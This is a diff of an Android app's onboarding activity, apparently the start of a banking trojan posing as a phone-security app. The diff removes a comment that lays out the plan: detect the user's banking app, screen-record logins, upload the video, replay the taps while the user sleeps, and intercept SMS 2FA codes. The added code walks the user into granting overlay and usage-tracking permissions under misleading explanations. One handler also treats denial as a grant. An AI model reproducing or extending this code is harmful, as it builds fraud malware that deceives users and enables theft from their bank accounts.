@@ -2,9 +2,13 @@ package com.example.jeanniesecure;
 //https://www.youtube.com/watch?v=byLKoPgB7yA&t=3s
 
 import android.Manifest;
+import android.app.AppOpsManager;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.media.Image;
 import android.net.Uri;
@@ -26,6 +30,8 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import java.util.List;
+
 public class MainActivity extends AppCompatActivity {
 
     private ViewPager mSlideViewPager;
@@ -44,7 +50,8 @@ public class MainActivity extends AppCompatActivity {
             "The GPS Location service in Phone Sage need permission",
             "We need this permission to read and write data when download file / backup or restore contacts and sms",
             "We need this permission to backup and restore contacts",
-            /*"We need this permission when receive a call",*/
+            "We need this permission when receive a call",
+            "We need this permission to track other application's usage",
             "We need this permission to backup and restore sms and send phone location to safe phone number",
             "We need this permission to read call log or intercept call",
     };
@@ -53,7 +60,8 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.READ_CONTACTS,
-            /*Manifest.permission.SYSTEM_ALERT_WINDOW,*/
+            Manifest.permission.SYSTEM_ALERT_WINDOW,
+            Manifest.permission.PACKAGE_USAGE_STATS,
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_PHONE_STATE,
     };
@@ -62,7 +70,8 @@ public class MainActivity extends AppCompatActivity {
             1,
             1,
             1,
-            /*5469,*/
+            5469,
+            123,
             1,
             1,
     };
@@ -72,21 +81,6 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-
-/*
-        if (1) {
-            //GO MAIN APPLICATION
-            //INITIALIZING SCREEN -> Threading/Services
-        }
-        else{
-            //ON BOARDING SCREEN
-            //INITIALIZING SCREEN -> Threading/Services
-            //Thread package name (Find out which iBanking app user use)
-            //Poll when use users one of iBanking app, ps -A  -> Screen record -> Store external storage
-            //Detect wifi connection -> Send video to server
-            //Only when video sent, wait for user inactive(Sleeping) -> open iBanking app, enter X,Y coordinates to login
-            //Intecept SMS for 2FA, then login success
-        }*/
 
         mSlideViewPager = (ViewPager) findViewById(R.id.slideViewPager);
         mDotLayout = (LinearLayout) findViewById(R.id.dotsLayer);
@@ -104,20 +98,29 @@ public class MainActivity extends AppCompatActivity {
         mNextBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view){
-                /*Log.d("permission code", Integer.toString(permissions_code[mCurrentPage]));
                 if (mCurrentPage == 3) {
-                    if (permissions_code[mCurrentPage] == 5469){
-                        if (!Settings.canDrawOverlays(MainActivity.this)) {
-                            // You don't have permission
-                            checkPermission();
-
-                        } else {
-                            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-                            startActivityForResult(intent, permissions_code[mCurrentPage]);
-                            Log.d("here","here");
+                    if (!Settings.canDrawOverlays(MainActivity.this)) {
+                        // You don't have permission
+                        /*checkPermission();*/
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            if (!Settings.canDrawOverlays(MainActivity.this)) {
+                                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                                startActivityForResult(intent, permissions_code[mCurrentPage]);
+                            }
                         }
+                    } else {
+                        mSlideViewPager.setCurrentItem(mCurrentPage+1);
                     }
-                } else*/ if (ContextCompat.checkSelfPermission( MainActivity.this,permissions[mCurrentPage]) == PackageManager.PERMISSION_GRANTED){
+                }
+                else if (mCurrentPage == 4) {
+                    if(!isAccessGranted()){
+                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                        startActivity(intent);
+                    } else{
+                        mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                    }
+                }
+                else if (ContextCompat.checkSelfPermission( MainActivity.this,permissions[mCurrentPage]) == PackageManager.PERMISSION_GRANTED){
                     if (mCurrentPage != permissions.length-1){
                         mSlideViewPager.setCurrentItem(mCurrentPage+1);
                     }
@@ -125,7 +128,8 @@ public class MainActivity extends AppCompatActivity {
                         Intent intent = new Intent(getApplicationContext(), Initialising.class);
                         startActivity(intent);
                     }
-                } else {
+                }
+                else {
                     requestStoragePermission(mCurrentPage);
                 }
             }
@@ -140,16 +144,22 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    public void checkPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, permissions_code[mCurrentPage]);
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == permissions_code[mCurrentPage]) {
+            if (Settings.canDrawOverlays(this)) {
+                Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
+                mSlideViewPager.setCurrentItem(mCurrentPage+1);
+            } else {
+                Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
             }
         }
     }
 
     private void requestStoragePermission(final int position) {
+        Log.d("requestStoragePermission", Integer.toString(position));
         if (ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[position])) {
             new AlertDialog.Builder(this)
                     .setTitle("Permission needed")
@@ -174,7 +184,18 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissionss, @NonNull int[] grantResults) {
-        if(requestCode == permissions_code[mCurrentPage]){
+        if (requestCode == 123){
+            if(grantResults.length > 0 && grantResults[0] == -1) {
+                Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
+                if (mCurrentPage != permissions.length-1){
+                    mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                }
+                else{
+                    Intent intent = new Intent(getApplicationContext(), Initialising.class);
+                    startActivity(intent);
+                }
+            }
+        } else if(requestCode == permissions_code[mCurrentPage]){
             if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
                 if (mCurrentPage != permissions.length-1){
@@ -190,9 +211,25 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private boolean isAccessGranted() {
+        try {
+            PackageManager packageManager = getPackageManager();
+            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getPackageName(), 0);
+            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+            int mode = 0;
+            if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.KITKAT) {
+                mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
+            }
+            return (mode == AppOpsManager.MODE_ALLOWED);
+
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+
 
     public void addDotsIndicator(int position){
-        mDots = new TextView[5];
+        mDots = new TextView[7];
         mDotLayout.removeAllViews();
 
         for(int i = 0 ; i < mDots.length ; i++) {
@@ -243,8 +280,24 @@ public class MainActivity extends AppCompatActivity {
                 }
 
             } else {
-                if (ContextCompat.checkSelfPermission( MainActivity.this,
-                        permissions[mCurrentPage-1]) == PackageManager.PERMISSION_GRANTED){
+                if (i == 4) {
+                    if (!Settings.canDrawOverlays(MainActivity.this)) {
+                        // You don't have permission
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            if (!Settings.canDrawOverlays(MainActivity.this)) {
+                                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                                startActivityForResult(intent, permissions_code[mCurrentPage]);
+                            }
+                        }
+                        mSlideViewPager.setCurrentItem(mCurrentPage-1);
+                    }
+                } else if (i == 5) {
+                    if(!isAccessGranted()){
+                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                        startActivity(intent);
+                        mSlideViewPager.setCurrentItem(mCurrentPage-1);
+                    }
+                } else if (ContextCompat.checkSelfPermission( MainActivity.this,permissions[mCurrentPage-1]) == PackageManager.PERMISSION_GRANTED){
                     mNextBtn.setEnabled(true);
                     mBackBtn.setEnabled(true);
                     mBackBtn.setVisibility(View.VISIBLE);
@@ -253,9 +306,9 @@ public class MainActivity extends AppCompatActivity {
                     mBackBtn.setText("Back");
                 } else {
                     mSlideViewPager.setCurrentItem(i-1);
+                    Log.d("NUMBER 2", "onPageSelected: ");
                     requestStoragePermission(i-1);
                 }
-
             }
         }
 
